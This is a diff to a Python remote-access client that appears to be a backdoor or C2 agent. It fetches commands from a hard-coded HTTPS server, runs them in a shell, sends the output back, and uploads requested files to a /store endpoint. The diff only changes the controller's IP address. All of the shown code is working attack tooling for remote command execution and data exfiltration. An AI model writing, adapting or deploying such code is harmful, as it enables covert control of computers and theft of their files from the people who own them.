@@ -51,14 +51,14 @@ def send_file(command, proxy=None):
     try:
         grab, path = command.strip().split(' ')
     except ValueError:
-        send_post("[-] Invalid grab command (maybe multiple spaces)", url=f'https://192.168.18.128:8443/store', verify_ssl=True, proxy=proxy)
+        send_post("[-] Invalid grab command (maybe multiple spaces)", url=f'https://10.118.24.13:8443/store', verify_ssl=True, proxy=proxy)
         return
 
     if not os.path.exists(path):
-        send_post("[-] Not able to find the file", url=f'https://192.168.18.128:8443/store', verify_ssl=True, proxy=proxy)
+        send_post("[-] Not able to find the file", url=f'https://10.118.24.13:8443/store', verify_ssl=True, proxy=proxy)
         return
 
-    store_url = f'https://192.168.18.128:8443/store'  # Posts to /store
+    store_url = f'https://10.118.24.13:8443/store'  # Posts to /store
     with open(path, 'rb') as fp:
         try:
             send_post(fp.read(), url=store_url, verify_ssl=False, proxy=proxy)  # True
@@ -69,8 +69,8 @@ def send_file(command, proxy=None):
 
 def run_command(command, proxy=None):
     CMD = subprocess.Popen(command, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
-    send_post(CMD.stdout.read(), url=f'https://192.168.18.128:8443', verify_ssl=False, proxy=proxy)  # True
-    send_post(CMD.stderr.read(), url=f'https://192.168.18.128:8443', verify_ssl=False, proxy=proxy)  # True
+    send_post(CMD.stdout.read(), url=f'https://10.118.24.13:8443', verify_ssl=False, proxy=proxy)  # True
+    send_post(CMD.stderr.read(), url=f'https://10.118.24.13:8443', verify_ssl=False, proxy=proxy)  # True
 
 def connect_to_https_server(verify_ssl=False, proxy=None):  # True
     # Create an SSL context
@@ -89,7 +89,7 @@ def connect_to_https_server(verify_ssl=False, proxy=None):  # True
 
     # Try connecting to the HTTPS server
     try:
-        command = request.urlopen(f"https://192.168.18.128:8443", context=context).read().decode()
+        command = request.urlopen(f"https://10.118.24.13:8443", context=context).read().decode()
         return command
     except (request.URLError, request.HTTPError, RemoteDisconnected) as e:
         print(f"Error connecting to HTTPS server: {e}")
